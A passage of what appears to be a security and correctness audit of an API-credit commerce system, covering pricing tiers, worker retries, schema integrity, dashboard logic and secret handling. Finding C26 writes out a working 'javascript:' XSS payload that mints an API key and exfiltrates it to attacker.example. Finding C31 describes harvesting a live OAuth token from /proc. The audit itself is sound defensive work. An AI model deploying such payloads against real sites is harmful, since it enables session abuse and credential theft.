`packages/db/src/pricing.ts:235` — _pricing-math_  
Every newly synchronized charge is added to the current aggregate tier_window_spent_nano regardless of whether occurred_at is before, inside, or after the current 30-day window. Closure then compares that undifferentiated aggregate and resets it to zero, so charges cross window boundaries in both directions.  
- **Failure:** A Builder window ends July 1 at 00:00 with only $40 spent before the cutoff. The next poll at 00:01 synchronizes a $10 charge made at 00:00:30. The code adds it to the old aggregate, sees $50, and incorrectly retains Builder. It then zeroes the aggregate, also losing that $10 from the new window where it actually belongs.  
- **Fix:** Calculate retention from deduplicated pricing_usage_events with `occurred_at >= window_start AND occurred_at < window_end`, or bucket events transactionally by explicit immutable window IDs. Carry post-cutoff events into the next window instead of resetting an undifferentiated total.  

**C21. [HIGH · CONFIRMED] Refunded payments keep their tier contribution and discount**  
`packages/db/src/pricing.ts:289` — _refund-state-machine_  
Tier state is an append-only sum of confirmed credits. There is no source-event ID on the tier contribution and no reversal path, so a later verified refund changes payment status but cannot remove the corresponding cumulative_topup_nano or downgrade the tier.  
- **Failure:** A customer pays $1,000, the credit worker adds 1_000_000_000_000 nanoUSD and promotes the account to Scale at multiplier 2000, then the provider issues a verified refund. The payment becomes `refunded`, but cumulative_topup_nano remains $1,000 and the Scale discount remains active, allowing continued 80%-discount usage after the money was returned.  
- **Fix:** Do not derive pricing from credits. If a prepay model is retained, store immutable, uniquely keyed paid/refunded pricing events and derive the net eligible amount transactionally, including compensating refund events and a durable multiplier synchronization.  

**C67. [MEDIUM · CONFIRMED] A failed credit retry update strands paid credit until process restart**  
`apps/worker/src/credit-worker.service.ts:71` — _retry-safety_  
If retryCredit itself fails after a job was claimed, the outer loop logs the error and continues, but the row remains `processing`. Stale processing rows are recovered only once during module initialization, not periodically, so the running worker will never reclaim it.  
- **Failure:** A paid credit is claimed, the engine request times out, and PostgreSQL is unavailable when retryCredit tries to change the row to `retry`. PostgreSQL recovers seconds later, but the row remains `processing`; claimNextCredit excludes it and the customer's paid balance is not delivered until an operator restarts the worker.  
- **Fix:** Run stale-lease recovery periodically, or reclaim expired processing leases as part of claimNextCredit. Also attach an outer per-job failure handler that attempts lease release and treats failure to persist retry state as a worker-health failure rather than silently continuing.  

**C68. [MEDIUM · CONFIRMED] A failed pricing retry update leaves the multiplier job permanently processing**  
`apps/worker/src/pricing-worker.service.ts:92` — _retry-safety_  
A database error in retryPricingJob is caught only by the outer polling loop. The job remains processing and cannot be claimed again; recoverStalePricingJobs runs only at startup.  
- **Failure:** The engine pricing endpoint returns 500 for a Pro upgrade, then PostgreSQL briefly fails during retryPricingJob. The process stays alive and continues polling, but the Pro synchronization row remains `processing`, so the engine retains the old multiplier indefinitely until the worker process is restarted.  
- **Fix:** Make lease expiry part of the normal claim query or execute stale recovery on every polling cycle. Ensure a failure to persist retry state cannot leave a job outside all claimable states.  

**C69. [MEDIUM · CONFIRMED] An email retry database error terminates the worker loop with an unhandled rejection**  
`apps/worker/src/email-worker.service.ts:78` — _worker-crash_  
The send/confirm catch block awaits retryEmail without an enclosing loop-level catch. If that database write fails, run() rejects, no handler is attached to the stored loop promise, and email processing stops or the Node process exits on the unhandled rejection.  
- **Failure:** SMTP successfully accepts a verification email, but confirmEmail fails during a PostgreSQL outage. The catch immediately calls retryEmail, which fails against the same outage. The run promise rejects; subsequent verification/reset messages are never claimed, and under Node's default unhandled-rejection behavior the shared process can terminate, also stopping credit and pricing workers.  
- **Fix:** Wrap each full loop iteration in a top-level try/catch and keep the loop alive after persistence failures. Periodically recover expired email leases, and attach a terminal rejection handler that deliberately shuts down/restarts the application rather than leaving a silently dead service.  

**C70. [MEDIUM · CONFIRMED] The topup tier helper cannot account for existing cumulative topups**  
`apps/web/src/lib/pricing-tiers.ts:20` — _ui-pricing-correctness_  
The helper claims to calculate a tier from cumulative topups but accepts only the new topup amount. Its actual dashboard caller passes the current input amount without adding pricing.spentNano, so checkout previews disagree with backend cumulative-tier calculation.  
- **Failure:** An account already has $900 in cumulative topups and enters a new $100 payment. The backend reaches $1,000 and promotes to Scale, but tierIndexForTopups(100) previews Builder and computes the wrong discount/API value before checkout.  
- **Fix:** Accept exact bigint nanoUSD for both current cumulative total and proposed topup, add them with BigInt, and classify the resulting total against shared bigint thresholds.  

**C101. [LOW · CONFIRMED] Tier closure can enqueue an invalid pricing job with an empty engine account ID**  
`packages/db/src/pricing.ts:349` — _durable-job-correctness_  
closeElapsedTierWindows includes engine_accounts rows whose engine_account_id is NULL and substitutes an empty string when enqueuing the durable multiplier job. The local tier downgrade commits even though the job can never address an engine account.  
- **Failure:** An active B2C profile's engine mapping is temporarily marked missing, leaving engine_account_id NULL, when its retention window expires. The function downgrades the local tier and creates a job for `""`; every engine request fails. Restoring the mapping does not rewrite this job's engineAccountId, so local and engine pricing can remain unsynchronized.  
- **Fix:** Do not close or mutate pricing for profiles without a valid active engine mapping. Persist a blocked/reconciliation state, and enqueue the multiplier job only after resolving the current non-null engine account ID under the same lock.  


### Backend · Admin + infra + DB schema  

**C22. [HIGH · CONFIRMED] B2C tiers are derived from top-ups instead of idempotently consumed charge-ledger rows**  
`packages/contracts/src/index.ts:190` — _pricing-integrity_  
The pricing contract explicitly defines tier progression by accumulated top-ups. The traced implementation uses these thresholds to change the engine multiplier, directly violating the invariant that B2C pricing must derive only from idempotently consumed engine charge-ledger entries. This lets deposited funds, rather than actual billable usage, determine the customer's discount.  
- **Failure:** A new B2C customer deposits $100 and makes zero API calls. The $100 top-up reaches the `builder` threshold, so the account is moved from multiplier 4000 to 3500 and receives a 65% discount despite having consumed no charge-ledger usage. A refunded top-up can therefore also leave the customer at an earned tier unless separately corrected.  
- **Fix:** Remove top-up totals from tier selection. Derive tier/month state only from `pricing_usage_events` inserted from engine ledger entries whose `kind` is `charge`, retain the `(engine_account_id, ledger_entry_id)` uniqueness guard, and calculate multiplier changes from that idempotent charge stream.  

**C23. [HIGH · CONFIRMED] Tier accrual has no exactly-once record, so one confirmed credit can be missed or counted twice**  
`packages/db/src/schema.ts:52` — _idempotency-race_  
The schema keeps tier accrual as a mutable aggregate (`cumulative_topup_nano`) but has no unique per-credit or per-ledger application record linking an engine credit to that aggregate. Tracing the credit worker shows that it first marks a credit confirmed and then separately increments this column. Those operations are neither atomic nor idempotent.  
- **Failure:** Missed count: the worker confirms a $100 engine credit and crashes before applying the tier update; the confirmed job is never claimed again, so the $100 never contributes to the tier. Double count: worker A is paused after claiming a credit; stale-job recovery requeues it and worker B confirms and applies the top-up. When A resumes, its conditional confirmation updates zero rows, but it still applies the top-up, increasing `cumulative_topup_nano` twice for one payment.  
- **Fix:** Create an idempotent pricing-accrual table keyed by `credit_id` or, preferably, remove top-up-based pricing entirely. If top-up accrual remains, insert the unique accrual row and update the profile in one transaction; retries must use `INSERT ... ON CONFLICT DO NOTHING`, and the aggregate must change only when that insert succeeds. Also make credit confirmation return whether its compare-and-set actually transitioned the row.  

**C24. [HIGH · CONFIRMED] Refunded and disputed payments have no durable engine-balance reversal path**  
`packages/db/src/schema.ts:23` — _payment-state-machine_  
The payment state machine models `refunded` and `disputed`, but the credit state machine can only create and confirm positive credits. There is no reversal/adjustment job, reversal idempotency key, or relationship recording that a refund was applied to the authoritative engine balance. Tracing refund handling confirms that it only changes commerce rows.  
- **Failure:** A customer pays $100, the positive `engine_credits` job is confirmed, and the engine balance is increased. The provider later sends a valid refund event. Commerce marks the payment and checkout refunded, but no engine debit or adjustment is queued, so the customer can continue spending the refunded $100. Replayed refund events cannot repair this because the schema has no idempotent reversal state.  
- **Fix:** Add a durable, idempotent engine-adjustment/reversal job keyed by the provider refund/dispute event and original payment. A verified refund must enqueue the exact negative adjustment (or disable/freeze the account when policy requires) in the same transaction that records the refund, and the worker must confirm the authoritative engine result before treating reversal as complete.  

**C25. [HIGH · CONFIRMED] Production may send the engine control key over plaintext HTTP**  
`apps/api/src/config.ts:8` — _secret-transport_  
`ENGINE_BASE_URL` accepts every URL scheme allowed by `URL`, including remote `http://` endpoints, with no production refinement. The value is passed together with `ENGINE_CONTROL_KEY` to `EngineClient`; the traced client sends that secret as the `x-api-key` header. A normal remote HTTP deployment therefore exposes the full engine administrative credential on the network.  
- **Failure:** Production is configured with `ENGINE_BASE_URL=http://engine.internal:8787`, which passes validation. A compromised sidecar, node, or network observer captures `x-api-key` from an admin request and can then call the Control API to create accounts, issue keys, or modify balances/pricing.  
- **Fix:** When `NODE_ENV === "production"`, require `https:` for non-loopback engine URLs and validate certificates. If engine and commerce communicate only locally, explicitly allow only loopback/Unix-socket transport for HTTP rather than accepting arbitrary remote plaintext URLs.  

**C71. [MEDIUM · CONFIRMED] The tier constraint admits index 5 although the contract defines only indexes 0 through 4**  
`packages/db/src/schema.ts:59` — _schema-contract-mismatch_  
`customer_profiles.current_tier` permits 5, but `B2C_PRICING_TIERS` contains five elements total. Code consuming a tier uses direct array indexing with a non-null assertion, so a database-valid row can produce `undefined` and crash pricing reads or tier-window processing.  
- **Failure:** A migration, repair script, or partially deployed writer stores `current_tier = 5`; PostgreSQL accepts it. A subsequent pricing-view request evaluates `B2C_PRICING_TIERS[5]` and accesses `.code`, returning a 500. The tier-window worker similarly dereferences the missing tier while calculating `holdNano` and stops processing that customer.  
- **Fix:** Change the constraint and migration to `BETWEEN 0 AND 4`, preferably deriving the maximum from a shared generated constant or representing tier codes with an enum so schema and contract cannot drift.  

**C102. [LOW · PLAUSIBLE] The database schema permits payment, owner, account, and amount records to contradict each other**  
`packages/db/src/schema.ts:259` — _referential-integrity_  
Duplicated financial ownership and amount columns are constrained independently, not as one chain. A payment references a checkout but may name a different `user_id` and unrelated amount; an engine credit references that payment but may name any external engine account and any positive amount. Current application code tries to keep these equal, but the database—the final integrity boundary for retries, migrations, and future writers—does not enforce it.  
- **Failure:** A faulty retry or maintenance statement inserts a payment whose `checkout_id` belongs to Alice but whose `user_id` is Bob, then creates an engine credit for Carol's `engine_account_id` with twice the checkout amount. Every present foreign key, uniqueness constraint, and positive-amount check succeeds. The credit worker then transfers the incorrect amount to Carol while the audit/payment rows attribute it inconsistently.  
- **Fix:** Make the relationships database-enforced: add suitable composite unique keys and foreign keys tying payment to the checkout owner and exact amount, tie engine accounts to their owning user, and tie each credit to the payment/checkout account and exact `amount_nano`. Where PostgreSQL cannot express the cross-table equality as a check, remove duplicated columns or enforce it with a constraint trigger.  

**C103. [LOW · PLAUSIBLE] The credit contract silently rounds unsafe JavaScript numeric money inputs**  
`packages/contracts/src/index.ts:128` — _integer-precision_  
`enqueueCreditSchema` uses `z.coerce.bigint()` directly, so it accepts JavaScript numbers even though money must enter as bigint or a decimal string. An unsafe JSON number has already lost precision before coercion, and converting that rounded number to bigint makes the corruption permanent. Other money schemas also explicitly accept safe JavaScript numbers, contrary to the stated transport invariant.  
- **Failure:** A caller supplies numeric `amountNano: 9007199254740993`. JavaScript represents it as `9007199254740992`; `z.coerce.bigint()` accepts that integer and returns `9007199254740992n`. The wrong amount can then be queued and credited without any validation failure.  
- **Fix:** Accept only canonical decimal strings at JSON/transport boundaries, reject number inputs, and convert with `BigInt` only after regex validation. For internal APIs, use `z.bigint()` without coercion. Keep response money fields as decimal strings end to end.  

**C104. [LOW · CONFIRMED] Remote PostgreSQL connections are allowed without TLS**  
`packages/db/src/client.ts:10` — _database-transport_  
The database client supplies only the connection string and pool size, so TLS is optional and entirely dependent on an unvalidated URI option. The environment schema accepts a remote PostgreSQL URL without `sslmode`, and node-postgres then permits a plaintext connection. This exposes commerce SQL traffic containing PII, authentication hashes, encrypted-token payloads, and payment records to network interception or modification.  
- **Failure:** Production uses `postgresql://commerce:password@db.internal:5432/commerce` against a server that permits non-TLS connections. The application starts and operates normally, but an observer on the cluster network can read or alter queries and results, including user emails, session/token hashes, payment state, and engine-account mappings.  
- **Fix:** Require TLS for non-loopback production databases and configure `ssl: { rejectUnauthorized: true, ca: ... }` (or an equivalently verified `sslmode`). Reject production remote URLs that explicitly disable TLS; allow plaintext only for loopback test/development databases.  


### Frontend · Logic (money/api/dashboard)  

**C26. [HIGH · PLAUSIBLE] Server-provided checkout URLs can execute `javascript:` in the authenticated app origin**  
`apps/web/src/app/dashboard/dashboard.tsx:293` — _xss_  
The dashboard navigates directly to the opaque `checkoutUrl` returned by the API without requiring HTTPS or an approved payment-provider origin. `Location.assign()` executes `javascript:` URLs in the current page context, so a malicious or compromised payment-provider response becomes authenticated same-origin script execution.  
- **Failure:** The checkout API returns `checkoutUrl: "javascript:(async()=>{const r=await fetch('https://backend.apitoken.sale/v1/api-keys',{method:'POST',credentials:'include',headers:{'content-type':'application/json'},body:'{}'});location='https://attacker.example/?k='+encodeURIComponent(await r.text())})()"`. When the user clicks Continue, the payload runs as `apitoken.sale`, uses the HttpOnly-backed session to issue an API key through the credentialed backend, and exfiltrates the response.  
- **Fix:** Validate at both boundaries. The backend should accept only `https:` checkout URLs on an explicit provider-host allowlist before storing/returning them. The client should independently parse with `new URL()`, reject non-HTTPS or unexpected origins, and show an error instead of navigating.  

**C27. [HIGH · CONFIRMED] Raw API keys are embedded in documentation URLs and persist in browser history**  
`apps/web/src/app/dashboard/dashboard.tsx:258` — _secret-exposure_  
The full `sk-pool-…` secret is placed in a URL fragment for the docs link. Fragments are not sent in HTTP requests, but they are visible to the destination page's JavaScript, address bar, browser history, history sync, and extensions. `rel="noreferrer"` does not protect a secret contained in the destination URL itself. The same behavior exists for per-row session keys at line 268.  
- **Failure:** A user clicks Open in docs. The new tab URL contains `#key=sk-pool-…`; the entry remains in browser history after the dashboard state is gone. A browser-history sync target, extension with history permission, later local user, or externally hosted docs origin can recover the full key and spend the account balance.  
- **Fix:** Never place credentials in URLs, including fragments. Prefer manual copy/paste. If same-origin prefill is required, open a fixed same-origin docs URL and transfer the key through a tightly origin-checked, one-shot in-memory channel such as `postMessage`, then immediately erase both sides' state; disable prefill entirely for external docs origins.  

**C72. [MEDIUM · CONFIRMED] Logout redirects even when the server session was not revoked**  
`apps/web/src/app/dashboard/dashboard.tsx:81` — _session-management_  
Logout deliberately suppresses every API failure and always routes to the login page. Because the session is held in an HttpOnly backend cookie, the client cannot clear it itself; a failed request leaves the authenticated session fully usable while presenting logout as successful.  
- **Failure:** On a shared computer, the logout POST is interrupted or returns 500. The user is sent to `/login` and walks away believing the session ended. The next person opens `/dashboard`; the unchanged cookie still authenticates them and permits account access, API-key issuance, revocation, and billing actions.  
- **Fix:** Redirect only after the logout endpoint succeeds. On network or server failure, keep the user on the page, display a clear error, and offer retry. If a forced local exit is offered, explicitly warn that the server session may remain active.  

**C73. [MEDIUM · CONFIRMED] Dismissing the one-time key panel does not erase or hide the raw key**  
`apps/web/src/app/dashboard/dashboard.tsx:245` — _secret-lifecycle_  
Every issued key is copied into `sessionRawKeys`, while the Done button only clears `issuedKey`. The key row at line 268 continues rendering Copy and docs-prefill controls from `sessionRawKeys`, contradicting the warning that the raw secret cannot be shown after the panel is dismissed and extending secret exposure beyond issuance.  
- **Failure:** A user creates a key, copies it, and clicks Done expecting the raw value to be removed. Later in the same dashboard session, opening API keys still presents a Copy button backed by the full secret. Anyone who gains momentary access to the still-open dashboard can retrieve that supposedly dismissed key.  
- **Fix:** Keep the raw key only in the issuance component and erase it when Done is clicked, the section changes, or the component unmounts. Remove raw-key actions from normal key rows. If session-long re-copy is intentionally retained, the one-time warning and security invariant must be changed explicitly rather than claiming dismissal erases access.  

**C74. [MEDIUM · CONFIRMED] Top-up preview ignores cumulative top-ups and can show the wrong tier and value**  
`apps/web/src/app/dashboard/dashboard.tsx:302` — _pricing-correctness_  
B2C tier selection is computed from the newly entered amount alone. The backend pricing state defines `pricing.spentNano` as cumulative top-ups and unlocks tiers from cumulative value, so the preview can regress an existing customer to a lower displayed tier or miss a tier that the new payment will unlock.  
- **Failure:** A Starter customer has `pricing.spentNano = "90000000000"` ($90 cumulative) and enters a $10 top-up. The UI runs `tierIndexForTopups(10)`, shows Starter at 60% and approximately $25 of official usage, and says Builder requires $100. The backend adds $10 to the existing $90, unlocks Builder at 65%, and the resulting $10 balance is worth approximately $28.57 at that tier. A Scale customer entering $10 is similarly shown as Starter even though their active tier remains Scale.  
- **Fix:** For B2C, compute projected cumulative nanoUSD as `BigInt(pricing.spentNano) + BigInt(amount) * 1_000_000_000n`, then select the milestone with BigInt comparisons. Never let the preview fall below the current effective tier, and derive remaining-to-next-tier from the server-provided cumulative state.  

**C75. [MEDIUM · CONFIRMED] Forbidden decimal and sign input is silently converted into a different valid payment amount**  
`apps/web/src/app/dashboard/dashboard.tsx:327` — _input-validation_  
The payment field removes every non-digit character instead of rejecting the original input. This defeats the backend rule that dots, fractions, and signs must be rejected: the backend receives a different digit-only value and cannot detect the user's invalid intent. The public preview repeats the same pattern in `topup-amount-input.tsx:19`.  
- **Failure:** A user pastes `1.5` intending $1.50. The handler changes it to `15`; `wholeUsdError("15")` passes and Continue creates a $15 checkout. Likewise, `-10` becomes a valid positive $10 rather than being rejected. The visual change can be missed during paste or rapid submission, producing a materially different payment.  
- **Fix:** Preserve the raw field value and validate it exactly against `^[1-9]\d*$`; do not repair dots, signs, separators, or leading zeros by deletion. Allow only the empty editing state, display a validation error for any other non-matching value, and submit only the exact validated string.  

**C76. [MEDIUM · CONFIRMED] Money from nanoUSD strings is repeatedly converted through JavaScript `number`**  
`apps/web/src/app/dashboard/dashboard.tsx:641` — _money-precision_  
The dashboard converts authoritative engine money from decimal strings/BigInt into binary floating-point for formatting, aggregation, tier estimates, charts, and totals. This violates the integer-money invariant and can change cent rounding for valid PostgreSQL `bigint` nanoUSD values. The shared `nanoNum` helper at line 744 propagates the same issue throughout the dashboard.  
- **Failure:** For `officialNano = "9000000000004999681"`, the exact amount is $9,000,000,000.004999681 and rounds to $9,000,000,000.00 at two decimals. `Number(BigInt(nano)) / 1e9` becomes approximately $9,000,000,000.005001 and formats as $9,000,000,000.01. Similar conversions occur in model totals, daily aggregates, key aggregates, account-value estimates, and ledger summaries.  
- **Fix:** Keep monetary values as BigInt nanoUSD through all sums and comparisons. Format with integer quotient/remainder logic. For chart ratios, first reduce bounded BigInt ratios to a fixed-point integer and only then convert that dimensionless bounded result to `number`, as `pricingMilestoneProgress` already does.  

**C77. [MEDIUM · CONFIRMED] The client hard-codes a $10,000 ceiling instead of enforcing the arbitrary digit-string rule or server policy**  
`apps/web/src/lib/money.ts:21` — _validation-policy_  
`wholeUsdError` rejects every valid positive whole-USD string above 10,000. This conflicts with the stated arbitrary-whole-USD invariant and also duplicates a deployment-specific backend limit in client code, so frontend and backend policy diverge whenever server MIN/MAX configuration changes.  
- **Failure:** The user enters `10001`, which satisfies the required `^[1-9]\d*$` format and is not a fixed catalog product, but the UI refuses to create the checkout. If the backend is deployed with `MAX_TOPUP_USD=50000`, valid $20,000 payments remain impossible through the website; if the backend minimum is raised, the inverse mismatch occurs and the client submits amounts the server rejects.  
- **Fix:** If top-ups are truly arbitrary, remove the ceiling and enforce only the exact digit-string rule client-side. If operational bounds are required, expose authoritative min/max policy from the backend and validate against that response rather than hard-coding a duplicated constant.  

**C105. [LOW · CONFIRMED] An auxiliary dashboard API failure discards successful identity/account responses and presents a false login state**  
`apps/web/src/app/dashboard/dashboard.tsx:56` — _error-handling_  
Required identity/account calls and auxiliary key/ledger calls are combined in one `Promise.all`, with state assignments performed only after every promise resolves. A non-authentication failure in any auxiliary endpoint therefore discards successful `/auth/me` and `/account` results; the subsequent guard renders a Login link because `user` and `account` remain null.  
- **Failure:** `/auth/me` and `/account` return 200 for a valid session, but `/account/ledger` returns 500. `Promise.all` rejects before `setUser` or `setAccount`; the dashboard renders the error inside the unauthenticated guard with a Log in button, falsely implying the session is invalid and making the whole dashboard unavailable because one history endpoint failed.  
- **Fix:** Load and commit authenticated identity/account state independently first. Fetch keys, ledger, and usage with separate error states or `Promise.allSettled`, preserving successful data. Only a verified 401 from the identity/session endpoint should transition the UI to login.  


### Cross-cutting · Layer connections  

**C28. [HIGH · CONFIRMED] B2C discounts are promoted from top-ups instead of authoritative engine charge-ledger rows**  
`packages/db/src/pricing.ts:273` — _pricing-integrity_  
The current pricing state machine raises a B2C tier from commerce-side confirmed top-up amounts. This violates the stated invariant that B2C pricing derives only from idempotently consumed engine charge-ledger rows, and contradicts docs/commerce/COMMERCIAL_BACKEND.md:102-103.
- **Failure:** A new B2C customer makes a $100 top-up but has made zero API requests. applyTopupTier adds 100,000,000,000 nano to cumulative_topup_nano, selects the Builder tier, and enqueues the lower 3500-bp multiplier. The customer's very first request is therefore charged at the promoted discount even though no authoritative engine charge usage exists.  
- **Fix:** Remove top-up-driven tier promotion. Compute tier/month state solely from deduplicated engine `charge` ledger rows keyed by `(engine_account_id, ledger_entry_id)`, and keep payment/top-up data separate from usage-derived pricing.  

**C29. [HIGH · CONFIRMED] A confirmed payment can permanently lose its pricing-tier update**  
`apps/worker/src/credit-worker.service.ts:55` — _state-machine_  
The worker marks an engine credit confirmed before applying the tier update, then treats the tier update as best-effort and swallows failures. Once confirmed, the credit job is no longer claimable, so neither a crash nor an applyTopupTier error is durably retried.  
- **Failure:** The engine successfully credits a $250 payment. confirmCredit commits status='confirmed', then the process crashes before line 60, or applyTopupTier fails due to a transient PostgreSQL error. On restart, claimNextCredit selects only pending/retry jobs, so this payment's 250,000,000,000 nano is never added to cumulative_topup_nano. The customer remains on a lower multiplier and is overcharged indefinitely; a later top-up adds only its own amount and does not recover the missed one.  
- **Fix:** Persist a separate idempotent pricing event/job in the same PostgreSQL transaction that confirms the credit, keyed by credit/payment ID, and retry it durably. Better, under the project invariant, remove this top-up tier mutation and derive pricing from the engine ledger consumer.  

**C30. [HIGH · CONFIRMED] Engine timeouts stop at response headers, so stalled bodies can hang API routes and workers forever**  
`packages/engine-client/src/index.ts:160` — _availability_  
EngineClient clears its AbortController timeout as soon as fetch resolves. Fetch resolves when response headers arrive, while every method reads response.text() afterward, outside the protected try/finally. A stalled or trickling response body is therefore not bounded by timeoutMs; post-header body failures also escape as raw errors instead of EngineClientError.  
- **Failure:** The engine or an intermediary sends `HTTP/1.1 200 OK` with a chunked JSON body containing only `{` and never completes it. With timeoutMs=10,000, fetch resolves immediately and line 179 clears the timer. getAccount, creditAccount, ledger, and other calls then wait forever in response.text(). Browser requests accumulate, and the single credit worker can stop processing all later paid credits. A one-off reproduction with timeoutMs=10 remained pending after 100 ms.  
- **Fix:** Keep the AbortController active through complete body consumption and parsing. Centralize fetch plus response.text() in one timed method, wrap body-read failures as retryable EngineClientError, and optionally enforce a small maximum Control API response size.  

**C80. [MEDIUM · CONFIRMED] Duplicate credit references can silently confirm a payment without crediting the intended account**  
`crates/registry/src/lib.rs:517` — _idempotency_  
The engine treats every unique-index violation on a top-up reference as a successful idempotent replay. It does not verify that the existing ledger row belongs to the same account and has the same amount. The Control API consequently returns HTTP 200 with the requested account's unchanged balance, and the commerce worker marks its local credit job confirmed.  
- **Failure:** First credit acct_A by 10,000,000,000 nano with ref "cryptomus:payment-1". Then submit a 25,000,000,000 nano credit for acct_B with the same ref, for example after a database restore, operator replay, or reference-generation collision. The second ledger insert hits the global unique index, acct_B's balance update is rolled back, but account_topup returns acct_B's current balance as success. EngineClient.creditAccount resolves and CreditWorkerService.confirmCredit marks the paid credit confirmed, so acct_B never receives the money and the job is never retried.  
- **Fix:** On a duplicate ref, load the existing top-up ledger row and compare account_id and amount_nano. Return the original success only when both match; otherwise return 409 Conflict. Include enough response data for EngineClient to validate the credited account and amount before confirming the commerce job.  

**C81. [MEDIUM · CONFIRMED] Cryptomus success and cancel redirects target frontend routes that do not exist**  
`apps/api/src/checkout.service.ts:43` — _route-contract_  
Checkout creation gives Cryptomus `/payments/{checkoutId}/success` and `/payments/{checkoutId}/cancel` return URLs, but the Next.js app has no matching pages, catch-all route, redirect, or rewrite. The browser client defines api.checkout(id), but no payment return handler calls it.  
- **Failure:** A user completes or cancels a Cryptomus checkout. Cryptomus redirects to `https://apitoken.sale/payments/<uuid>/success` or `/cancel`. Next.js returns 404 because the app only has routes such as `/dashboard`, `/auth/callback`, and a single-segment `[slug]`; the payment may already have credited through the webhook, but the user sees a broken page and no authoritative status.  
- **Fix:** Add success/cancel pages that validate the UUID, call GET `/v1/checkouts/{id}` with the session cookie, display pending/paid/canceled state, and route back to Credits. Alternatively redirect both provider outcomes to an existing dashboard route with the checkout ID in the query string and implement polling there.  

**C82. [MEDIUM · CONFIRMED] Parallel dashboard reads race engine-account recovery and can overwrite an active mapping with error state**  
`apps/api/src/account.service.ts:28` — _race-condition_  
ensureEngineAccount has no per-user lock or compare-and-set state transition. Multiple requests can all observe a pending/error mapping and provision concurrently. Engine account creation is a read-then-create operation by handle, so losers can receive 409; every loser then calls failEngineAccount unconditionally, which can run after another request successfully called completeEngineAccount.  
- **Failure:** An OAuth user's initial engine provisioning failed, leaving status='error'. On dashboard load, account, apiKeys, ledger, and usage are requested concurrently. All four call ensureEngineAccount. One creates/credits the stable engine account and marks the mapping active; another loses the handle race, receives 409, and then executes failEngineAccount after the successful completion. The mapping ends in status='error', Promise.all rejects, and subsequent reloads can repeat the race. Signup credit is idempotent, but dashboard/account availability is not.  
- **Fix:** Serialize provisioning per user with a PostgreSQL advisory lock or a durable provisioning lease/state version. Make failEngineAccount conditional on the row still being the pending attempt being failed, and make the engine's create-by-handle endpoint atomically return the existing row after a unique-handle conflict.  

**C83. [MEDIUM · CONFIRMED] The dashboard presents a 100-row ledger slice as complete monthly usage**  
`apps/web/src/app/dashboard/dashboard.tsx:56` — _pagination_  
The dashboard fetches only the newest 100 ledger entries, while charge counts, daily charts, per-key totals, transaction history, and top-up history are all calculated from that truncated array. The browser-facing ledger endpoint exposes only `limit`, not pagination or a completeness indicator.  
- **Failure:** An account makes 101 API requests in the current month. The oldest charge is omitted from api.ledger(100). The dashboard reports 100 charge events, omits its amount from the calendar chart and per-key totals, and may omit top-ups even sooner because top-ups and adjustments share the same 100-row limit. Nothing tells the user that these are partial results.  
- **Fix:** Add authenticated pagination to `/v1/account/ledger` and fetch all rows required for the displayed window, or expose authoritative per-day/per-key aggregates from the engine usage endpoint. Return `hasMore`/cursor metadata and label partial data explicitly.  

**C107. [LOW · CONFIRMED] Frontend analytics convert exact nanodollar strings to JavaScript Number**  
`apps/web/src/app/dashboard/dashboard.tsx:744` — _money-precision_  
Although the API contract correctly transports engine money as decimal strings, the dashboard converts those values through Number for balances, charges, model totals, charts, and displayed derived values. This violates the integer-money invariant and loses precision above 2^53 nano.  
- **Failure:** For an accepted engine balance of `9007200004999999` nano, the exact value is $9,007,200.004999999 and rounds to $9,007,200.00 at cents. `Number(BigInt(nano)) / 1e9` becomes 9,007,200.005, and the dashboard's `toLocaleString(... maximumFractionDigits: 2)` displays $9,007,200.01. Similar conversions affect chart sums and official-value calculations.  
- **Fix:** Keep monetary arithmetic in bigint nanodollars or a decimal/fixed-point library. Extend the existing bigint-safe money helpers for rounding, ratios, and chart scaling; only convert normalized dimensionless values to Number after proving they are within a safe range.  

**C108. [LOW · CONFIRMED] The canonical Control API contract still advertises a floating-point credit path**  
`docs/engine/CONTROL_API.md:101` — _money-contract_
The guide says all money is exact integer nanodollars, but documents `{"usd"?...}` and its canonical example sends `{"usd":25}`. The implemented engine deserializes usd as f64 and converts with multiplication and rounding. Current EngineClient correctly uses amount_nano, but another backend following the stated integration contract can lose precision.  
- **Failure:** An integrator follows the guide and credits the valid whole-USD amount 8,000,000,001 via `{"usd":8000000001,"ref":"payment-1"}`. IEEE-754 conversion produces 8,000,000,000,999,999,488 nano instead of the exact 8,000,000,001,000,000,000 nano, short-crediting by 512 nano despite the documented nanodollar-exact invariant.  
- **Fix:** Remove or deprecate the f64 `usd` field from the Control API. Accept only integer `amount_nano`, or an exact decimal/whole-USD string parsed without floating point. Update every example to use amount_nano or a string field.  

**C109. [LOW · CONFIRMED] Ledger model data expected by the frontend is never supplied by the backend**  
`apps/web/src/lib/api.ts:32` — _response-contract_  
The frontend declares an optional model for each ledger charge and the usage UI uses it for per-day model segmentation, but AccountService omits model from every mapped ledger entry and the Control API ledger response contains no model field. Consequently the model-aware daily graph cannot work.  
- **Failure:** An account uses both Claude Opus and Claude Sonnet on the same day. `/account/usage` correctly reports two aggregate model rows, but every ledger charge has model undefined. The daily usage graph executes `charge.model || UNKNOWN_MODEL`, so all spending appears under one “Other models” segment rather than the actual models.  
- **Fix:** Persist or join the charge's model into the Control API ledger response and map it through AccountService, or remove the per-ledger model assumption and build the visualization from an authoritative engine aggregate that actually has time-and-model dimensions.  


### Cross-cutting · Secrets & config hygiene  

**C31. [HIGH · CONFIRMED] Fingerprint refresh exposes a live subscription OAuth token in process arguments**  
`tools/refresh-fingerprint.sh:78` — _secret-exposure_  
The daily root-run fingerprint job reads a usable subscription token from SQLite and passes it as an argument to `runuser ... env`. On the documented/default Ubuntu `/proc` configuration, the `runuser` command line is readable through `ps` or `/proc/<pid>/cmdline`, exposing the token to unrelated local users for the duration of the up-to-45-second Claude invocation. The same job also records every intercepted request header, including `Authorization`, in a temporary file and has no EXIT trap to remove it after termination.  
- **Failure:** A compromised process running as the separate `deploy` user waits for `claude-api-fingerprint.timer`, scans `/proc/*/cmdline`, and reads `CLAUDE_CODE_OAUTH_TOKEN=<live token>` from the root-owned `runuser` process. It can then use or exfiltrate that subscription credential without access to `subscriptions.db`. A SIGKILL after capture can additionally leave the Authorization-bearing `$CAP` file in `/tmp`.  
- **Fix:** Never place the token in argv. Launch the child with a sanitized environment using a mechanism where the secret is inherited only as environment data after exec, or write it to a root/agents-readable temporary credential file or pipe and delete it immediately. Filter `authorization`, `x-api-key`, cookies, and proxy authorization from the capture at collection time, install an EXIT/TERM trap for every temporary file/process, and harden `/proc` visibility.  

**C32. [HIGH · CONFIRMED] The engine dashboard invites operators to persist the Control key in browser localStorage**  
